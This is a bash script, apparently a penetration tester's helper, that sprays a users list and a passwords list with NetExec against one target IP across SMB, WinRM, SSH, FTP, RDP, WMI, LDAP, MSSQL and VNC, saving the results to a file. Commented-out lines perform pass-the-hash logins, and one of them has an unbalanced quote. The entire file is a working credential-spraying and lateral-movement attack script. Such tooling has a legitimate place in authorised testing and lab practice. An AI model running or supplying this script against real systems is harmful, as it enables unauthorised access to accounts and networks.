#!/bin/bash

# Bash script that I can run whenever I get a new username, password, or hash

# Check if an IP address is provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <IP address>"
    exit 1
fi

IP=$1
OUTPUT_FILE="output.txt"

# NetExec commands, outputting to stdout and a file
{
    echo "Running NetExec commands for IP: $IP"
    nxc smb $IP -u users.txt -p passwords.txt --continue-on-success
    nxc winrm $IP -u users.txt -p passwords.txt --continue-on-success
    nxc ssh $IP -u users.txt -p passwords.txt --continue-on-success
    nxc ftp $IP -u users.txt -p passwords.txt --continue-on-success
    nxc rdp $IP -u users.txt -p passwords.txt --continue-on-success
    nxc wmi $IP -u users.txt -p passwords.txt --continue-on-success
    nxc ldap $IP -u users.txt -p passwords.txt --continue-on-success
    nxc mssql $IP -u users.txt -p passwords.txt --continue-on-success
    nxc vnc $IP -u users.txt -p passwords.txt --continue-on-success

# nxc smb $IP -u users.txt -H $HASH --continue-on-success
# nxc ldap $IP -u users.txt -H $HASH --continue-on-success
# nxc winrm $IP -u users.txt -H $HASH --continue-on-success
# nxc mssql $IP -u users.txt -H $HASH --continue-on-success
# nxc ftp $IP -u users.txt -H "$HASH --continue-on-success
# nxc rdp $IP -u users.txt -H $HASH --continue-on-success
# nxc wmi $IP -u users.txt -H $HASH --continue-on-success

} | tee $OUTPUT_FILE
